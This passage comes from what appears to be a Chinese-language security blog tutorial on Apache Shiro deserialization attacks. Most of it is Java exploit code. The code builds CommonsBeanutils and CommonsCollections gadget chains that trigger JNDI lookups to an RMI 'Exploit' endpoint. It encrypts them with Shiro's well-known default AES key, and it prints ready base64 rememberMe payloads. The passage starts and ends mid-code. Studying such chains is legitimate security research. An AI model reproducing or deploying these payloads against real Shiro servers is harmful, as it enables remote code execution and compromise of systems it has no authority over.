class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE,key,ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptBytes = cipher.doFinal(CBbytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CB链</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + encryptBytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(encryptBytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, encryptBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilBase64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(evilBase64);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * AES解密，模拟shiro反序列化</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">byte</span>[] decode = Base64.decode(evilBase64);<br>        <span class="hljs-type">byte</span>[] deIV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[]  deEvilBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decode.length - deIV.length];<br>        System.arraycopy(decode,<span class="hljs-number">0</span>,deIV,<span class="hljs-number">0</span>,deIV.length);<br>        System.arraycopy(decode,deIV.length,deEvilBytes,<span class="hljs-number">0</span>,deEvilBytes.length);<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIV);<br>        cipher.init(Cipher.DECRYPT_MODE,key,deIvSpec);<br>        <span class="hljs-type">byte</span>[] deEvil = cipher.doFinal(deEvilBytes);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvil);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9L3y5N8MW8iFfeSugI+i7ayGvI5zma4flvI0+Ohs0e75iasXZ3R32UCQwCKgUnh0mU63auBEG0Cp2Ej402UIE3o7aDh4sYQ9eOPeErUZhxgVXPEwS0jSobopf1XLG+U84xHW<span class="hljs-regexp">/PZwmedp9fFUKZb43tRoIYEJbLbaoZ+6IPdiljQxyNIt1UKp9kTUdIRMfZbQ+XP0om/</span>c4zO5gSMZGC5zkML5L8xyfEb8FRoTUVzIEu6OkWTfuTZNE2Iu6josCSaJfWqgeU+lSWLUO<span class="hljs-regexp">/U2h7+ysKZzIiT0OGvHNJPQuTbNtD4UNcqVnWslexMivy4j3jna/</span>qJWiyL825Iup4xj+IUguTPEbANdN<span class="hljs-regexp">/QjG9kvMPF1H47HoRw8I77cM575xF8KiYJXqfOTMdfkCKBi79iLrHTuwwRwWav1WhXmKs8nwCL1w2R9qoaXvaDMDNGQKpO0XHGsEeLOI9I1tg9RHatCYclF0DMVqLGInN5ZBq8Rd7G+L5f72ijtdSOZfSAM4VPpUFEUZhhauKNW5DTqYDKfrJHQvWJawoXKp0vK0xQoTr45TcgMv6ChEUTb7f+K0Ehb9G0XYVFIhJhgqQD8O+fD4mHt2ae4Hzi+9Y+GZmSdLyq8iM3l0+j9Tvt/</span><span class="hljs-regexp">/5CZSov9wE7BZmTY7YLgMP8dzNJfE5H42E+/</span>Fh89GUOYW7EHTF+<span class="hljs-number">6</span>ywmGfavFiO83Cm2LFGfyyiAW5VFZnEaafRiJWRmf+ig62Oxt+<span class="hljs-number">6</span>j5OWe1YiViDwi6Uu9SYd2Ql1zTSqxwvMMUzBVyAafzgY2wsU32qS4P2nietjz7rhtmJh5UsNKDMeLnTjLSPfAYxmp+nyAw13Og5KpRqAimMNueU0gBfVwpkkd7MWSMyMNhuj1AsCcPUdnFQ8HON9w3y3DIbPoaOZxY<span class="hljs-regexp">/j327bnR4TZ2QGwe1D9dlw56wxRTaEpjFKwoLIRfqT53HF3A+O6SYvbw6L5Jsrkea7LFGwdL935eglE+/</span>dlMDz<span class="hljs-regexp">//y</span>OSfiX6jKvme9j3xfhSXeSrjZhGkCOdKea1XQRkm1B+dKx8CmIPY<span class="hljs-regexp">/IoGSTx8ayimutvGC9Kt/</span>rijlE9uMv8K7ftrlPs8w021jPwqgN3LaZnEPAVjBrt1+<span class="hljs-number">8</span>aJod+D1KS4qkmfUXTVt2<span class="hljs-regexp">/gjB+35VOo6+riVz9o3WWhs+/</span>RoZH5DnuQFHPsIMqEnuN3QZI8KNOk<span class="hljs-regexp">/FVyG9cbrBlGf7M0wjMPd9/</span>cU=<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420191944371.png" srcset="/img/loading.gif" lazyload alt="image-20250420191944371"></p>
+<p>需要注意的是  BeanComparator 这个类的构造方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420192446736.png" srcset="/img/loading.gif" lazyload alt="image-20250420192446736"></p>
+<p>看到</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250420192545420.png" srcset="/img/loading.gif" lazyload alt="image-20250420192545420" style="zoom:50%;" />
+
+<p>所以 payload 在初始化的时候，传入的是 AttrCompare</p>
+<blockquote>
+<p>BeanComparator beanComparator &#x3D; new BeanComparator(“outputProperties”, new AttrCompare());</p>
+</blockquote>
+<h3 id="CB、CC-JNDI"><a href="#CB、CC-JNDI" class="headerlink" title="CB、CC-JNDI"></a>CB、CC-JNDI</h3><p>目标可以出网的时候，我们可以利用 JdbcRowSetImpl 这个类进行 JNDI 的一系列攻击，在讨论 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18788161#jdbcrowsetimpl">fasjson1.2.24</a> 时，也有用到这个类进行 JNDI 的攻击，在 fastjson 中主要用到的方法是 setAutoCommit 去调用 connect() 方法，触发 JNDI 攻击。</p>
+<p>不熟悉 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18772225">JNDI</a> 和 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LINGX5/p/18761103">RMI</a> 的话，可以参考我这两篇文章</p>
+<p>事实上 connect() 方法在 JdbcRowSetImpl 中调用的地方还有很多</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421135933032.png" srcset="/img/loading.gif" lazyload alt="image-20250421135933032"></p>
+<p>CC 链的 InvokeTransformer 具有反射调用任意方法的能力，而 CB 链的 PropertyUtil 具有调用 getter 方法的能力。这也成为了我们可以利用的点，如果目标采用高版本的 JDK，需要开启 <code>trustCodeBase = true</code> 。</p>
+<blockquote>
+<p>System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);<br>System.setProperty(“com.sun.jndi.ldap.object.trustURLCodebase”, “true”);</p>
+</blockquote>
+<p><strong>我们先来看低版本 jdk7u80 没有做 trustURLCodebase 限制的版本</strong></p>
+<h4 id="CBJNDI"><a href="#CBJNDI" class="headerlink" title="CBJNDI"></a>CBJNDI</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CBJNDI</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;databaseMetaData&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jdbcRowSet,<span class="hljs-string">&quot;lingx5&quot;</span>&#125;);<br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化CB链</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CBbytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE,key,ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptBytes = cipher.doFinal(CBbytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CB链</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + encryptBytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(encryptBytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, encryptBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilBase64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(evilBase64);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * AES解密，模拟shiro反序列化</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">byte</span>[] decode = Base64.decode(evilBase64);<br>        <span class="hljs-type">byte</span>[] deIV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[]  deEvilBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decode.length - deIV.length];<br>        System.arraycopy(decode,<span class="hljs-number">0</span>,deIV,<span class="hljs-number">0</span>,deIV.length);<br>        System.arraycopy(decode,deIV.length,deEvilBytes,<span class="hljs-number">0</span>,deEvilBytes.length);<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIV);<br>        cipher.init(Cipher.DECRYPT_MODE,key,deIvSpec);<br>        <span class="hljs-type">byte</span>[] deEvil = cipher.doFinal(deEvilBytes);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvil);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9L3y5N8MW8iFfeSugI+i7ayGvI5zma4flvI0+Ohs0e75iasXZ3R32UCQwCKgUnh0mU63auBEG0Cp2Ej402UIE3o7aDh4sYQ9eOPeErUZhxgVXPEwS0jSobopf1XLG+U84xHW<span class="hljs-regexp">/PZwmedp9fFUKZb43tRoIYEJbLbaoZ+6IPdiljQxyNIt1UKp9kTUdIRMfZbQ+XXL96FlqUjDjMpEuQ/</span><span class="hljs-number">04</span>P4sr0Q4TMcO8gKx2MsXdjE1wMXm4xUoNmYCKS+gP40cuQ9ZkjOpWD4xK8PPjHAKi4B<span class="hljs-regexp">/yX23PeseYG4BgEJ7Wxt43UBMuBkK8uAiq8+i9thHK3HOoWQBQcpfbUErwt97Dt2KVRnjfeH/</span>W<span class="hljs-regexp">/H8H9Y80fenJnQ52jn08qvCfWUaogKbIRcWgpkHji3hhSb1/</span>F8TDJIozRzyIRfLZN6S4mONEXOR2CCiPwIRvptY5OvpWmgc0za9EP4ptxlXAZ5tFBnQ4FkQnm0fkW2YjNNvJAdmf8H9VM4vBER6ylig8W53p8E2or<span class="hljs-regexp">/Yo80Iv2OKEZvgMa6mdDp6oNSH02r7SHsgShUY1lvRhOQPnpqQ6bkwgztgzALHnUJE8RToC/</span><span class="hljs-number">41</span>PwfWC8JXLMAxl+NOpQ9JIHg1JRBW2WENaVARKxdPbR3CTUjza63NkOesCYpphTA2EPzWKS0tPUOoguYiwfbfk6sCs+NNP78rtIMxJ7r28fYZrhUsZQ19Yva3hVeW5l2BGx0dX9<span class="hljs-regexp">/+5XpBLKPwPS3bi2mukP/</span><span class="hljs-number">7</span>WlX6PIn0wK5cQbYh7iCAn9RMaFcrMs5MPsa2tA6Emdmsl<span class="hljs-regexp">//</span>ZKLztCYN41cytm8Q5ILppBUexuI+AL7quGOWZ5tnMVd8T5N9UZW6iLbccEzzwK3A2yZXy0Z5C3wSlvur7jdgFgzxAO<span class="hljs-regexp">/frwHyWp2W3YdNVLCNs88mbMVwOtDvHsyrX7i/</span>SYhrSZGwd+<span class="hljs-number">3</span>AjHtmtRq991YbzF5Wr+P2HgMub7nc7DLLgzt7JitTp<span class="hljs-regexp">/OHWUiY3toGXVwtkpzD+3FAi3g3tGzWTvZI9qYaan3d82BVcjVFNEgfg3yF+W4vLnaMczVc3JVyp/</span>zvDWamt3mdHurxE3h1NhhpMCo09IRYIpbFT8PBXDwXdLq9T3EbqWd5dHhq+wWQ0Ns1DPwHMd6dah6d9nXN617atL7mAR9xJPjsQwxb6cAzJD3fEXQ6ESpOIx9oBoePh90QEI<span class="hljs-regexp">/nL4RPIQHigy5Vp1ABykdnzg9MwIEbRzB6yi+a55SYyoSVFwNQ3DsO7TPxL/</span>oW5MNSGvDhgCG8AVRJ6ZbdSWg4lBnfTSWdIwKBIswvTFGKs656nfVwInX4qhrk7KEbSFYu0S4kQwIEHwjpldn4A12pZ1jGjF+<span class="hljs-number">5</span>U2fBYr8usLcorVdJ7o7ZYZ<span class="hljs-regexp">/J0m/i</span>+nan6h1KrPoRIyVHEKZdw3SIA6uWepdsDcHgxIBzelJbSV6d15RPq6qcwpIRaehkepAItfn2wCizCarD0rCuAhTSg3pPmKmlbuO3xwP928lniY66bEdAnhzDH3p4tai8YDYA99uJrirTGuEZoY2g6QsJ2Zdoe6cFwHFTdVLahnhPzspyooI3hXkTlQSj3+RqAxZpECgYMeODY5jrLIwqde+NQfm1BJB3YzMLbcmWXO+F2Ff9p6JUdlXFO3xnrrYxJTqSiFp6HrvD1PAQmbP2bSCJ82LgxbeJwTtRNxzpH9bMYpYLLdSiC1FtRXlLgINI<span class="hljs-regexp">/C0VCzXO3eL8LD0yGE5XFUitd8gE5Nq1XvMiiaY/</span>NqE9f99QSX9kXo9B0JnIgT90z3s2kPTKrhfPz0+lpHzOkPc2Ch2hA5EMcj0MpH0DWZG8ICqHZ3EvcwXU6X2hAlpYH9<span class="hljs-regexp">/86LgXqGLKmnhT614YxXoPMrfiymewHnuZ2dsNLPyp9p/</span>sSQCSMBADfad2FO3Yg==<br></code></pre></td></tr></table></figure>
+
+<p>开启对应的 RMI 和 http 服务</p>
+<center>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250421151245612.png" srcset="/img/loading.gif" lazyload alt="image-20250421151245612" width=450px;" />
+ <img src="https://gitee.com/ling-x5/img/raw/master/image-20250421151413989.png" srcset="/img/loading.gif" lazyload alt="image-20250421151413989" width=450px;" />
+</center>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421152015972.png" srcset="/img/loading.gif" lazyload alt="image-20250421152015972"></p>
+<h4 id="CCJNDI"><a href="#CCJNDI" class="headerlink" title="CCJNDI"></a>CCJNDI</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CCJNDI</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; clazz = obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDatabaseMetaData&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, jdbcRowSet);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(tiedMapEntry,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        setField(lazyMap,<span class="hljs-string">&quot;factory&quot;</span>,invokerTransformer);<br>        lazyMap.remove(jdbcRowSet);<br>        <span class="hljs-keyword">return</span> map;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化map gadget</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CC321bytes = baos.toByteArray();<br><br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span 